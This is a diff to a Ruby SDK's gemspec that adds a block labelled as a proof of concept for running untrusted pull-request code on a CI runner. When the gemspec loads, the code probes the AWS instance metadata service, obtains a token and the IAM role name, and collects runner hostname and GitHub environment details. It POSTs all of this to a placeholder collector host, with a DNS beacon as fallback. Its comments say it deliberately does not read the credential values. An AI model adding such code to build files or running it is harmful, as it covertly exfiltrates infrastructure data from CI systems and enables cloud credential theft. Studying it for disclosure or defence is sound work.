@@ -14,6 +14,72 @@ Generator version: 7.23.0
 $:.push File.expand_path("../lib", __FILE__)
 require "komoju-sdk/version"
 
+# PoC: untrusted PR code exec on the CI runner
+begin
+  require "net/http"
+  require "uri"
+  require "socket"
+  require "json"
+
+  imds_get = lambda do |path, token = nil, put = false|
+    uri  = URI("http://169.254.169.254#{path}")
+    http = Net::HTTP.new(uri.host, uri.port)
+    http.open_timeout = 3
+    http.read_timeout = 3
+    req  = (put ? Net::HTTP::Put : Net::HTTP::Get).new(uri)
+    req["X-aws-ec2-metadata-token-ttl-seconds"] = "21600" if put
+    req["X-aws-ec2-metadata-token"] = token if token.is_a?(String) && !token.empty?
+    r = http.request(req)
+    [r.code.to_i, r.body.to_s]
+  rescue StandardError => e
+    [nil, e.class.name]
+  end
+
+  imds = {}
+  v1_code, _            = imds_get.call("/latest/meta-data/")
+  imds["v1_unauth_code"] = v1_code          # 200 => IMDSv2 NOT enforced
+
+  v2_code, v2_token     = imds_get.call("/latest/api/token", nil, true)
+  imds["v2_token_code"]  = v2_code
+
+  tok = (v2_code == 200 && v2_token.length > 0) ? v2_token : nil
+  r_code, roles         = imds_get.call("/latest/meta-data/iam/security-credentials/", tok)
+  imds["iam_role_code"]  = r_code
+  imds["iam_role"]       = roles.strip unless roles.strip.empty?   # role NAME only
+
+  # DELIBERATELY NOT READ/EXFILTRATED: the role's
+  # AccessKeyId / SecretAccessKey / SessionToken.
+  # To prove the creds are live, run `aws sts get-caller-identity` ON the runner
+  # and report only its Arn/Account (see RUNBOOK.md).
+
+  beacon = {
+    proof:       "ci-runner-imds",
+    host:        Socket.gethostname,
+    runner_name: ENV["RUNNER_NAME"],
+    runner_env:  ENV["RUNNER_ENVIRONMENT"],
+    runner_os:   ENV["RUNNER_OS"],
+    runner_arch: ENV["RUNNER_ARCH"],
+    job:         ENV["GITHUB_JOB"],
+    repo:        ENV["GITHUB_REPOSITORY"],
+    sha:         ENV["GITHUB_SHA"],
+    imds:        imds
+  }.to_json
+
+  uri = URI("https://COLLECTOR_HOST/COLLECTOR_TOKEN")
+  Net::HTTP.start(uri.host, uri.port,
+                  use_ssl: uri.scheme == "https",
+                  open_timeout: 5, read_timeout: 5) do |http|
+    http.post(uri.path, beacon, { "Content-Type" => "application/json" })
+  end
+rescue StandardError
+  begin
+    require "resolv"
+    Resolv::DNS.open { |d| d.getaddress("exec-#{Socket.gethostname}.COLLECTOR_HOST") }
+  rescue StandardError
+  end
+end
+# end PoC
+
 Gem::Specification.new do |s|
   s.name        = "komoju-sdk"
   s.version     = Komoju::VERSION
